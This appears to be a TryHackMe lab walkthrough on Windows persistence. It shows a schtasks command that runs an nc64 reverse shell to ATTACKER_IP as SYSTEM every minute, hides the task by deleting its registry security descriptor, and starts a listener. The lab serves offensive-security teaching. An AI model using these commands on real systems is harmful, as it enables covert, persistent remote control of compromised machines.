

The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use `schtasks` to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:

Command Prompt

```shell-session
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

**Note:** Be sure to use `THM-TaskBackdoor` as the name of your task, or you won't get the flag.

The previous command will create a "THM-TaskBackdoor" task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:

Command Prompt

```shell-session
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:

Command Prompt

```shell-session
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:

![Task Scheduler SD](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png)

If we try to query our service again, the system will tell us there is no such task:

Command Prompt

```shell-session
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:

AttackBox

```shell-session
user@AttackBox$ nc -lvp 4449
```

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)Use the reverse shell obtained through the task scheduler and execute `C:\flags\flag9.exe` to retrieve a flag.

Ask Echo

Answer the questions below